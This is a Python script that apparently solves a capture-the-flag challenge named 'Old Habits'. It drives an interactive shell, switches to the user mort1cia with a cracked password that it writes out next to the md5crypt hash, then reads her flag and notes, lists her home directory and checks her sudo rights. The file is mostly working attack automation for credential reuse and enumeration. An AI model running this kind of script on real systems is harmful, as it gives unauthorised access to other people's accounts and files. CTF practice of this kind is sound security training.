"""Old Habits (350): su mort1cia with the cracked password -> read her flag."""
import asyncio
import os
import re
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import find_flags as ff  # noqa: E402
from find_flags import Shell  # noqa: E402

MORT_PW = "princess2015"          # md5crypt-verified against
# mort1cia:$1$de4df4ce$1pZYBMgWLPXg1tZo6pke20


def ff_clean(s):
    s = re.sub(r"\x1b\[[0-9;?]*[a-zA-Z]", "", s)
    return s.replace("\x1b[?2004l", "").replace("\x1b[?2004h", "").strip()


async def wait_for(sh, needle, timeout=45.0):
    buf, loop = "", asyncio.get_event_loop()
    end = loop.time() + timeout
    while loop.time() < end:
        buf += await sh.read(1.5)
        if needle in buf:
            return True, buf
    return False, buf


async def cmd(sh, command, timeout=45.0):
    tag = "Z" + uuid.uuid4().hex[:7]
    await sh.send(command)
    await asyncio.sleep(0.3)
    await sh.send(f"echo {tag}D")
    ok, buf = await wait_for(sh, f"{tag}D", timeout)
    return ff_clean("\n".join(l for l in buf.splitlines() if tag not in l)), ok


async def su_to(sh, user, password):
    await sh.send(f"su - {user}")
    got, _ = await wait_for(sh, "Password:", 25.0)
    if not got:
        return False
    await sh.send(password)
    await asyncio.sleep(3.0)
    await sh.read(2.0)
    who, _ = await cmd(sh, "id", 25)
    return user in who


async def body(sh):
    await sh.read(5.0)
    print("start:", (await cmd(sh, "id"))[0][:120], flush=True)

    print("\n### su mort1cia (cracked pw: princess2015)", flush=True)
    if not await su_to(sh, "mort1cia", MORT_PW):
        print("[!] su mort1cia failed", flush=True)
        return False
    print("now:", (await cmd(sh, "whoami; id"))[0], flush=True)

    print("\n### mort1cia's home", flush=True)
    print(await cmd(sh, "ls -laR /home/mort1cia/ 2>&1 | head -40"), flush=True)

    print("\n### FLAG", flush=True)
    print(await cmd(sh, "cat /home/mort1cia/flag.txt 2>/dev/null"), flush=True)

    print("\n### exact bytes (od)", flush=True)
    print(await cmd(sh, "od -c /home/mort1cia/flag.txt 2>/dev/null | head -4"), flush=True)

    print("\n### her notes", flush=True)
    print(await cmd(sh, "cat /home/mort1cia/*.txt 2>/dev/null"), flush=True)

    print("\n### sudo as mort1cia", flush=True)
    print(await cmd(sh, "sudo -n -l 2>&1 | head -20"), flush=True)
    return True


async def main():
    for attempt in range(1, 5):
        try:
            async with Shell() as sh:
                if await body(sh):
                    return
                return
        except Exception as e:
            print(f"[outer {attempt}] {type(e).__name__}: {e}", flush=True)
        await asyncio.sleep(6)


asyncio.run(main())
